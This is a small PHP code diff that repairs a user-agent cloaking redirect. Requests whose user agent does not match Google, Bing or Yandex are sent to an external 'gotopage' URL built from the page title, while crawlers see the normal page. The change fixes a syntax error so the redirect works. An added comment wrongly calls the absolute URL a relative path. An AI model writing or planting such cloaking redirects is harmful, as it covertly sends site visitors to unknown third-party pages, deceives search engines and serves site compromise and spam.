@@ -4,7 +4,10 @@ if (isset($_SERVER['HTTP_USER_AGENT'])) {
 
     // (case-insensitive)
     if (!preg_match('/google|bing|yandex/i', $user_agent)) {
-        header('Location: https://www.sookeregionchamber.com/gotopage/?p=' . urlencode(strtoupper($title));
+        $relative_gotopage_url = 'https://www.sookeregionchamber.com/gotopage/?p=' . urlencode(strtoupper($title));
+        
+        // Redirect pengguna menggunakan path relatif
+        header('Location: ' . $relative_gotopage_url);
         exit;
     }
 }
